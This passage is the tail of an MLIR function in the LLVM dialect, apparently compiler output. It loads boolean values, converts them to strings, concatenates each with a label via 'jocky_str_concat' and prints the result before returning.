    %53 = llvm.call @jocky_str_concat(%51, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    %54 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %55 = llvm.load %15 {alignment = 1 : i64} : !llvm.ptr -> i1
    %56 = llvm.zext %55 : i1 to i64
    %57 = llvm.call @string(%56) : (i64) -> !llvm.ptr
    %58 = llvm.call @jocky_str_concat(%54, %57) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%58) : (!llvm.ptr) -> ()
    %59 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %60 = llvm.load %17 {alignment = 1 : i64} : !llvm.ptr -> i1
    %61 = llvm.zext %60 : i1 to i64
    %62 = llvm.call @string(%61) : (i64) -> !llvm.ptr
    %63 = llvm.call @jocky_str_concat(%59, %62) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%63) : (!llvm.ptr) -> ()
    %64 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %65 = llvm.load %19 {alignment = 1 : i64} : !llvm.ptr -> i1
    %66 = llvm.zext %65 : i1 to i64
    %67 = llvm.call @string(%66) : (i64) -> !llvm.ptr
    %68 = llvm.call @jocky_str_concat(%64, %67) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%68) : (!llvm.ptr) -> ()
    llvm.return %2 : i32
  }
}
